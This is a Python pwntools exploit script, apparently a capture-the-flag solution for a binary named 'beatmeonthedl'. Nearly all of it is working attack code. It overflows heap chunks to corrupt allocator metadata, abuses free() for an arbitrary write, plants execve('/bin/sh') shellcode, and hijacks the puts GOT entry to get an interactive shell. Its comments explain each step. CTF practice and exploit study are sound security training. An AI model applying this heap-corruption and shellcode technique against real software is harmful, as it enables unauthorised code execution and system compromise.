from pwn import *

p = process("./beatmeonthedl")
#p = remote("beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me", 6969)
res = p.recvuntil("Enter username: ")
p.sendline("mcfly")
res = p.recvuntil("Enter Pass: ")
p.sendline("awesnap")
#adds four request texts:
res = p.recvuntil("| ")
p.sendline("1")
res = p.recvuntil("Request text > ")
p.sendline("CCCCCCCC")
res = p.recvuntil("| ")
p.sendline("1")
res = p.recvuntil("Request text > ")
p.sendline("DDDDDDDD")
res = p.recvuntil("| ")
p.sendline("1")
res = p.recvuntil("Request text > ")
p.sendline("EEEEEEEE")
res = p.recvuntil("| ")
p.sendline("1")
res = p.recvuntil("Request text > ")
p.sendline("FFFFFFFF")

#replaces the third text, overflowing the fourth
res = p.recvuntil("| ")
p.sendline("4")
res = p.recvuntil("choice: ")
p.sendline("2")
res = p.recvuntil("data: ")
p.sendline("A"*56 + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x80\x9e\x60\x00\x00\x00\x00\x00" + "\x90\x9f\x60\x00\x00\x00\x00\x00")

#deletes the third text, causing a bug on the free function and writing 0x609f90 at 0x609e80 + 0x18 (fourth position)
res = p.recvuntil("| ")
p.sendline("3")
res = p.recvuntil("choice: ")
p.sendline("2")

#writes our shellcode at 0x609f90 (the fourth position)
res = p.recvuntil("| ")
p.sendline("4")
res = p.recvuntil("choice: ")
p.sendline("3")
res = p.recvuntil("data: ")
p.sendline("\x90"*10 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

#replaces the first text, overflowing the second
res = p.recvuntil("| ")
p.sendline("4")
res = p.recvuntil("choice: ")
p.sendline("0")
res = p.recvuntil("data: ")
p.sendline("A"*56 + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x70\x9e\x60\x00\x00\x00\x00\x00" + "\x58\x99\x60\x00\x00\x00\x00\x00")

#deletes the first text, causing a bug on the free function and writing 0x609958 at 0x609e70 + 0x18 (second position)
res = p.recvuntil("| ")
p.sendline("3")
res = p.recvuntil("choice: ")
p.sendline("0")

#writes the address of our shellcode in the put got (0x609f90) to force it to be executed when printing the menu
res = p.recvuntil("| ")
p.sendline("4")
res = p.recvuntil("choice: ")
p.sendline("1")
res = p.recvuntil("data: ")
p.sendline("\x90\x9f\x60\x00\x00\x00\x00\x00")

p.interactive()
